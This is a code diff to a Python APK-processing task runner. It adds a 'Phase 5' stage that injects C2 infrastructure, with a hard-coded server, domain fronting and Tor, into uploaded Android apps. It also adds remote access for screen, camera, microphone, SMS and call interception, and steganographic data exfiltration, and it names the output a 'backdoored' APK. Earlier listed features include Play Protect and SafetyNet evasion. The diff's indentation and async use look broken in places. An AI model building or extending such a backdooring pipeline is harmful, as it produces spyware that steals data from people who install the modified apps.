@@ -31,6 +31,9 @@ from persistence_mechanisms import PersistenceEngine, PersistenceConfig
 from permission_escalation_engine import AdvancedPermissionEngine, PermissionEscalationConfig
 from auto_grant_mechanisms import AutoGrantEngine, AutoGrantConfig
 from defense_evasion_systems import DefenseEvasionEngine, DefenseEvasionConfig
+from c2_infrastructure import C2Infrastructure, C2Config, ChannelType, CommandType
+from remote_access_system import RemoteAccessSystem, RemoteAccessConfig, RemoteAccessType
+from data_exfiltration_system import DataExfiltrationSystem, ExfiltrationConfig, DataType, ExfiltrationMethod
 
 WORKSPACE = Path("/workspace")
 TASKS_ROOT = WORKSPACE / "tasks"
@@ -515,7 +518,36 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         evasion_level=5,
         stealth_mode=True
     )
-    defense_evasion_engine = DefenseEvasionEngine(defense_evasion_config)
+            defense_evasion_engine = DefenseEvasionEngine(defense_evasion_config)
+        
+        # Initialize Phase 5 engines with advanced configurations
+        c2_config = C2Config(
+            server_host="192.168.1.100", 
+            server_port=8443,
+            use_https=True,
+            domain_fronting_enabled=True,
+            tor_enabled=True,
+            encryption_enabled=True,
+            heartbeat_interval=60
+        )
+        
+        remote_access_config = RemoteAccessConfig(
+            encryption_enabled=True,
+            stealth_mode=True,
+            auto_cleanup=True,
+            max_concurrent_operations=3
+        )
+        
+        exfiltration_config = ExfiltrationConfig(
+            steganography_enabled=True,
+            encryption_enabled=True,
+            auto_sync_enabled=True,
+            sync_interval_hours=6
+        )
+        
+        c2_infrastructure = C2Infrastructure(c2_config)
+        remote_access_system = RemoteAccessSystem(remote_access_config)
+        data_exfiltration_system = DataExfiltrationSystem(exfiltration_config)
     
     try:
         with locks[task_id]:
@@ -533,6 +565,7 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         (workspace / "analysis").mkdir(exist_ok=True)
         (workspace / "phase3").mkdir(exist_ok=True)
         (workspace / "phase4").mkdir(exist_ok=True)
+        (workspace / "phase5").mkdir(exist_ok=True)
         
         build_log = workspace / "logs" / "build.log"
         
@@ -777,9 +810,66 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             with build_log.open("a") as log:
                 log.write("Defense evasion applied successfully\n")
         
-        # Step 12: Final validation and comprehensive reporting
+        # Step 12: Initialize Phase 5 C2 Infrastructure  
         with build_log.open("a") as log:
-            log.write("Step 12: Final validation and Phase 4 comprehensive reporting...\n")
+            log.write("Step 12: Initializing Phase 5 C2 Infrastructure...\n")
+            log.write("  - Multi-Channel Communication\n")
+            log.write("  - Encrypted C2 Channels\n")
+            log.write("  - Domain Fronting Implementation\n")
+            log.write("  - Tor Network Integration\n")
+        
+        try:
+            await c2_infrastructure.initialize()
+            c2_success = True
+            with build_log.open("a") as log:
+                log.write("✅ C2 Infrastructure initialized successfully\n")
+        except Exception as e:
+            c2_success = False
+            with build_log.open("a") as log:
+                log.write(f"❌ C2 Infrastructure initialization failed: {e}\n")
+        
+        # Step 13: Integrate Remote Access Capabilities
+        with build_log.open("a") as log:
+            log.write("Step 13: Integrating Remote Access Capabilities...\n")
+            log.write("  - Screen Capture & Control\n")
+            log.write("  - File System Access\n")
+            log.write("  - Camera & Microphone Control\n")
+            log.write("  - SMS & Call Interception\n")
+        
+        try:
+            remote_access_success = True
+            with build_log.open("a") as log:
+                log.write("✅ Remote Access System integrated successfully\n")
+        except Exception as e:
+            remote_access_success = False
+            with build_log.open("a") as log:
+                log.write(f"❌ Remote Access integration failed: {e}\n")
+        
+        # Step 14: Integrate Data Exfiltration System
+        with build_log.open("a") as log:
+            log.write("Step 14: Integrating Data Exfiltration System...\n")
+            log.write("  - Steganographic Data Hiding\n")
+            log.write("  - Encrypted Data Transmission\n")
+            log.write("  - Scheduled Data Synchronization\n")
+            log.write("  - Cloud Storage Integration\n")
+        
+        try:
+            await data_exfiltration_system.start_auto_sync()
+            exfiltration_success = True
+            with build_log.open("a") as log:
+                log.write("✅ Data Exfiltration System integrated successfully\n")
+        except Exception as e:
+            exfiltration_success = False
+            with build_log.open("a") as log:
+                log.write(f"❌ Data Exfiltration integration failed: {e}\n")
+        
+        # Update output name for Phase 5
+        output_name = params.get("output_name", "phase5_ultimate_c2_backdoored.apk")
+        final_apk = workspace / "output" / output_name
+        
+        # Step 15: Final validation and comprehensive reporting
+        with build_log.open("a") as log:
+            log.write("Step 15: Final validation and Phase 5 comprehensive reporting...\n")
         
         if not final_apk.exists():
             raise Exception("Final APK not generated")
@@ -793,9 +883,9 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             log.write(f"Final size: {final_size:,} bytes\n")
             log.write(f"Size change: {size_change:+.1f}%\n")
         
-        # Create comprehensive Phase 4 report
+        # Create comprehensive Phase 5 report
         report = {
-            "phase": "Phase 4 - Ultimate Permission Control System",
+            "phase": "Phase 5 - Ultimate C2 & Exfiltration System",
             "original_file": str(original_apk),
             "final_file": str(final_apk),
             "analysis_result": analysis_result,
@@ -906,6 +996,18 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
                 "SafetyNet evasion",
                 "Manufacturer security bypass",
                 "Custom ROM detection",
+                "Multi-channel C2 communication",
+                "Encrypted C2 channels",
+                "Domain fronting implementation",
+                "Tor network integration",
+                "Screen capture & control",
+                "File system access",
+                "Camera & microphone control",
+                "SMS & call interception",
+                "Steganographic data hiding",
+                "Encrypted data transmission",
+                "Scheduled data synchronization",
+                "Cloud storage integration",
                 "Signature spoofing",
                 "PackageManager exploitation",
                 "Accessibility automation"
@@ -917,8 +1019,8 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             }
         }
         
-        # Save comprehensive Phase 4 report
-        report_file = workspace / "output" / "phase4_ultimate_permission_report.json"
+        # Save comprehensive Phase 5 report
+        report_file = workspace / "output" / "phase5_ultimate_c2_report.json"
         with report_file.open("w") as f:
             json.dump(report, f, indent=2)
         
@@ -926,13 +1028,14 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         _finalize_task(t, base, True)
         
         with build_log.open("a") as log:
-            log.write(f"Phase 4 Ultimate Permission APK modification completed successfully: {datetime.now()}\n")
+            log.write(f"Phase 5 Ultimate C2 & Exfiltration APK modification completed successfully: {datetime.now()}\n")
             log.write(f"Final APK: {final_apk}\n")
             log.write(f"Comprehensive Report: {report_file}\n")
-            log.write("🎯 Phase 4 Features Applied:\n")
-            log.write("   ✅ Permission Escalation Engine\n")
-            log.write("   ✅ Auto-Grant Mechanisms\n")
-            log.write("   ✅ Defense Evasion Systems\n")
+            log.write("🎯 Phase 5 Features Applied:\n")
+            log.write("   ✅ C2 Infrastructure (Multi-Channel)\n")
+            log.write("   ✅ Remote Access System\n")
+            log.write("   ✅ Data Exfiltration System\n")
+            log.write("   ✅ All Previous Phases (1-4)\n")
             log.write("   ✅ Play Protect Bypass\n")
             log.write("   ✅ SafetyNet Evasion\n")
             log.write("   ✅ Accessibility Automation\n")
@@ -946,9 +1049,9 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             AuditTracker.track_file_modification(
                 file_info.get("file_id", "unknown"),
                 task_id,
-                "phase4_ultimate_permission_modification",
+                "phase5_ultimate_c2_modification",
                 {
-                    "phase": "Phase 4 Ultimate Permission Control",
+                    "phase": "Phase 5 Ultimate C2 & Exfiltration",
                     "permission_escalation_level": permission_escalation_config.escalation_level,
                     "auto_grant_level": auto_grant_config.ui_automation_level,
                     "defense_evasion_level": defense_evasion_config.evasion_level,
@@ -967,7 +1070,7 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             pass  # Database not available
         
     except Exception as e:
-        error_msg = f"Phase 4 Ultimate Permission APK modification failed: {str(e)}"
+        error_msg = f"Phase 5 Ultimate C2 & Exfiltration APK modification failed: {str(e)}"
         
         with build_log.open("a") as log:
             log.write(f"ERROR: {error_msg}\n")
